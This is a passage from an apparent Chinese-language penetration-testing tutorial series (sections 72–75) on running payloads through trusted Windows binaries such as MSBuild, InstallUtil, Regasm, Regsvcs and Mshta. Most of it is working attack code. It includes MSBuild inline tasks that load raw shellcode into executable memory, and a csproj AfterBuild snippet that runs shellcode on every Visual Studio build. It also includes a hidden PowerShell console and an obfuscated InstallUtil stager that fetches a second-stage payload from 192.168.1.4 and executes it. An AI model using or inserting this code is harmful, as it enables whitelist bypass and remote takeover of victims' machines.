</span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode &#x3D; new byte[276] &#123;</span><br><span class="line">              0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,</span><br><span class="line">              0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,</span><br><span class="line">              0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,</span><br><span class="line">              0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,</span><br><span class="line">              0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,</span><br><span class="line">              0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,</span><br><span class="line">              0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,</span><br><span class="line">              0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,</span><br><span class="line">              0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,</span><br><span class="line">              0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,</span><br><span class="line">              0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,</span><br><span class="line">              0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,</span><br><span class="line">              0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,</span><br><span class="line">              0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,</span><br><span class="line">              0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,</span><br><span class="line">              0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,</span><br><span class="line">              0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,</span><br><span class="line">              0x63,0x2e,0x65,0x78,0x65,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">              UInt32 threadId &#x3D; 0;</span><br><span class="line">              IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">              hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br><span class="line">&lt;&#x2F;Project&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>executes PowerShellCommands.xml</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion&#x3D;&quot;4.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;developer&#x2F;msbuild&#x2F;2003&quot;&gt;</span><br><span class="line">  &lt;!-- This inline task executes c# code. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml --&gt;</span><br><span class="line">   &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name&#x3D;&quot;Hello&quot;&gt;</span><br><span class="line">   &lt;FragmentExample &#x2F;&gt;</span><br><span class="line">   &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;FragmentExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;ParameterGroup&#x2F;&gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">      &lt;Using Namespace&#x3D;&quot;System&quot; &#x2F;&gt;</span><br><span class="line">	  &lt;Using Namespace&#x3D;&quot;System.IO&quot; &#x2F;&gt;</span><br><span class="line">      &lt;Code Type&#x3D;&quot;Fragment&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">			    Console.WriteLine(&quot;Hello From Fragment&quot;);</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">	&lt;&#x2F;UsingTask&gt;</span><br><span class="line">	&lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">	&lt;Task&gt;</span><br><span class="line">	  &lt;Reference Include&#x3D;&quot;System.Management.Automation&quot; &#x2F;&gt;</span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">		</span><br><span class="line">			using System;</span><br><span class="line">			using System.IO;</span><br><span class="line">			using System.Diagnostics;</span><br><span class="line">			using System.Reflection;</span><br><span class="line">			using System.Runtime.InteropServices;</span><br><span class="line">			&#x2F;&#x2F;Add For PowerShell Invocation</span><br><span class="line">			using System.Collections.ObjectModel;</span><br><span class="line">			using System.Management.Automation;</span><br><span class="line">			using System.Management.Automation.Runspaces;</span><br><span class="line">			using System.Text;</span><br><span class="line">			using Microsoft.Build.Framework;</span><br><span class="line">			using Microsoft.Build.Utilities;</span><br><span class="line">							</span><br><span class="line">			public class ClassExample :  Task, ITask</span><br><span class="line">			&#123;</span><br><span class="line">				public override bool Execute()</span><br><span class="line">				&#123;</span><br><span class="line">					</span><br><span class="line">					while(true)</span><br><span class="line">					&#123;</span><br><span class="line">						</span><br><span class="line">						Console.Write(&quot;PS &gt;&quot;);</span><br><span class="line">						string x &#x3D; Console.ReadLine();</span><br><span class="line">						try</span><br><span class="line">						&#123;</span><br><span class="line">							Console.WriteLine(RunPSCommand(x));</span><br><span class="line">						&#125;</span><br><span class="line">						catch (Exception e)</span><br><span class="line">						&#123;</span><br><span class="line">							Console.WriteLine(e.Message);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">								return true;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				&#x2F;&#x2F;Based on Jared Atkinson&#39;s And Justin Warner&#39;s Work</span><br><span class="line">				public static string RunPSCommand(string cmd)</span><br><span class="line">				&#123;</span><br><span class="line">					&#x2F;&#x2F;Init stuff</span><br><span class="line">					Runspace runspace &#x3D; RunspaceFactory.CreateRunspace();</span><br><span class="line">					runspace.Open();</span><br><span class="line">					RunspaceInvoke scriptInvoker &#x3D; new RunspaceInvoke(runspace);</span><br><span class="line">					Pipeline pipeline &#x3D; runspace.CreatePipeline();</span><br><span class="line">					&#x2F;&#x2F;Add commands</span><br><span class="line">					pipeline.Commands.AddScript(cmd);</span><br><span class="line">					&#x2F;&#x2F;Prep PS for string output and invoke</span><br><span class="line">					pipeline.Commands.Add(&quot;Out-String&quot;);</span><br><span class="line">					Collection&lt;PSObject&gt; results &#x3D; pipeline.Invoke();</span><br><span class="line">					runspace.Close();</span><br><span class="line">					&#x2F;&#x2F;Convert records to strings</span><br><span class="line">					StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class="line">					foreach (PSObject obj in results)</span><br><span class="line">					&#123;</span><br><span class="line">						stringBuilder.Append(obj);</span><br><span class="line">					&#125;</span><br><span class="line">					return stringBuilder.ToString().Trim();</span><br><span class="line">				 &#125;</span><br><span class="line">				 </span><br><span class="line">				 public static void RunPSFile(string script)</span><br><span class="line">				&#123;</span><br><span class="line">					PowerShell ps &#x3D; PowerShell.Create();</span><br><span class="line">					ps.AddScript(script).Invoke();</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line"> </span><br><span class="line">			</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br><span class="line">&lt;&#x2F;Project&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>executes shellcode when visual studio is afterBuild.csproj</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- This inline task executes shellcode when visual studio is afterbuild. --&gt;</span><br><span class="line">&lt;!-- Add the following code into the .csproj file --&gt;</span><br><span class="line">&lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line"></span><br><span class="line">&lt;Target Name&#x3D;&quot;AfterBuild&quot;&gt;</span><br><span class="line">    &lt;ClassExample &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName&#x3D;&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory&#x3D;&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile&#x3D;&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">    </span><br><span class="line">      &lt;Code Type&#x3D;&quot;Class&quot; Language&#x3D;&quot;cs&quot;&gt;</span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT &#x3D; 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode &#x3D; new byte[195] &#123;</span><br><span class="line">              0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">              0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">              0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">              0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">              0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">              0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">              0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">              0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">              0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,</span><br><span class="line">              0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,</span><br><span class="line">              0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">              UInt32 threadId &#x3D; 0;</span><br><span class="line">              IntPtr pinfo &#x3D; IntPtr.Zero;</span><br><span class="line">              hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      &lt;&#x2F;Code&gt;</span><br><span class="line">    &lt;&#x2F;Task&gt;</span><br><span class="line">  &lt;&#x2F;UsingTask&gt;</span><br></pre></td></tr></table></figure>
<h2 id="72-基于白名单Installutil-exe执行payload第二季"><a href="#72-基于白名单Installutil-exe执行payload第二季" class="headerlink" title="72. 基于白名单Installutil.exe执行payload第二季"></a>72. 基于白名单Installutil.exe执行payload第二季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机编译</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;r:System.Ente rpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:Micropoor.exe &#x2F;keyfile:C:\Users\John\Desktop\installutil.snk &#x2F;unsafe C:\Users\John\Desktop\installutil.cs</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U Micropoor.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>附录：Micropoor.cs</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net; </span><br><span class="line">using System.Linq; </span><br><span class="line">using System.Net.Sockets; </span><br><span class="line">using System.Runtime.InteropServices; </span><br><span class="line">using System.Threading; </span><br><span class="line">using System.Configuration.Install; </span><br><span class="line">using System.Windows.Forms;</span><br><span class="line"></span><br><span class="line">public class GQLBigHgUniLuVx &#123;</span><br><span class="line">	public static void Main()</span><br><span class="line">	&#123;</span><br><span class="line">		while(true)</span><br><span class="line">		&#123;&#123; MessageBox.Show(&quot;doge&quot;); Console.ReadLine();&#125;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">[System.ComponentModel.RunInstaller(true)]</span><br><span class="line"></span><br><span class="line">public class esxWUYUTWShqW : System.Configuration.Install.Installer</span><br><span class="line">&#123;</span><br><span class="line">	public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)</span><br><span class="line">	&#123;</span><br><span class="line">		jkmhGrfzsKQeCG.LCIUtRN();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">public class jkmhGrfzsKQeCG</span><br><span class="line">&#123;</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)]private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);</span><br><span class="line">	[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);</span><br><span class="line">	static byte[] ErlgHH(string ZwznjBJY, int KsMEeo) </span><br><span class="line">	&#123;</span><br><span class="line">		IPEndPoint qAmSXHOKCbGlysd &#x3D; new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);</span><br><span class="line">		Socket XXxIoIXNCle &#x3D; new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">		try </span><br><span class="line">		&#123; </span><br><span class="line">			XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); </span><br><span class="line">		&#125;</span><br><span class="line">		catch &#123; return null;&#125;</span><br><span class="line">		byte[] UmquAHRnhhpuE &#x3D; new byte[4];</span><br><span class="line">		XXxIoIXNCle.Receive(UmquAHRnhhpuE, 4, 0);</span><br><span class="line">		int kFVRSNnpj &#x3D; BitConverter.ToInt32(UmquAHRnhhpuE, 0);</span><br><span class="line">		byte[] qaYyFq &#x3D; new byte[kFVRSNnpj + 5];</span><br><span class="line">		</span><br><span class="line">		int SRCDELibA &#x3D; 0;</span><br><span class="line">		while (SRCDELibA &lt; kFVRSNnpj)</span><br><span class="line">		&#123; SRCDELibA +&#x3D; XXxIoIXNCle.Receive(qaYyFq, SRCDELibA + 5, (kFVRSNnpj - SRCDELibA) &lt; 4096 ? (kFVRSNnpj - SRCDELibA) : 4096, 0);&#125;</span><br><span class="line">		byte[] TvvzOgPLqwcFFv &#x3D; BitConverter.GetBytes((int)XXxIoIXNCle.Handle);</span><br><span class="line">		Array.Copy(TvvzOgPLqwcFFv, 0, qaYyFq, 1, 4); qaYyFq[0] &#x3D; 0xBF;</span><br><span class="line">		return qaYyFq;</span><br><span class="line">	&#125;</span><br><span class="line">	static void cmMtjerv(byte[] HEHUjJhkrNS)</span><br><span class="line">	&#123;</span><br><span class="line">		if (HEHUjJhkrNS !&#x3D; null)</span><br><span class="line">		&#123;</span><br><span class="line">			UInt32 WcpKfU &#x3D; VirtualAlloc(0, (UInt32)HEHUjJhkrNS.Length, 0x1000, 0x40);</span><br><span class="line">			Marshal.Copy(HEHUjJhkrNS, 0, (IntPtr)(WcpKfU), HEHUjJhkrNS.Length);</span><br><span class="line">			IntPtr UhxtIFnlOQatrk &#x3D; IntPtr.Zero;</span><br><span class="line">			UInt32 wdjYKFDCCf &#x3D; 0; </span><br><span class="line">			IntPtr XVYcQxpp &#x3D; IntPtr.Zero;</span><br><span class="line">			UhxtIFnlOQatrk &#x3D; CreateThread(0, 0, WcpKfU, XVYcQxpp, 0, ref wdjYKFDCCf);</span><br><span class="line">			WaitForSingleObject(UhxtIFnlOQatrk, 0xFFFFFFFF); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void LCIUtRN()</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] IBtCWU &#x3D; null; IBtCWU &#x3D; ErlgHH(&quot;192.168.1.4&quot;, 53);</span><br><span class="line">		cmMtjerv(IBtCWU);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="73-基于白名单Regasm-exe执行payload第三季"><a href="#73-基于白名单Regasm-exe执行payload第三季" class="headerlink" title="73. 基于白名单Regasm.exe执行payload第三季"></a>73. 基于白名单Regasm.exe执行payload第三季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe &#x2F;U Micropoor.dll</span><br></pre></td></tr></table></figure>
<h2 id="74-基于白名单Regsvcs-exe执行payload第四季"><a href="#74-基于白名单Regsvcs-exe执行payload第四季" class="headerlink" title="74. 基于白名单Regsvcs.exe执行payload第四季"></a>74. 基于白名单Regsvcs.exe执行payload第四季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll</span><br></pre></td></tr></table></figure>
<h2 id="75-基于白名单Mshta-exe执行payload第五季"><a href="#75-基于白名单Mshta-exe执行payload第五季" class="headerlink" title="75. 基于白名单Mshta.exe执行payload第五季"></a>75. 基于白名单Mshta.exe执行payload第五季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\mshta.exe</span><br><span class="line">C:\Windows\SysWOW64\mshta.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>配置payload</strong></li>
</ul>
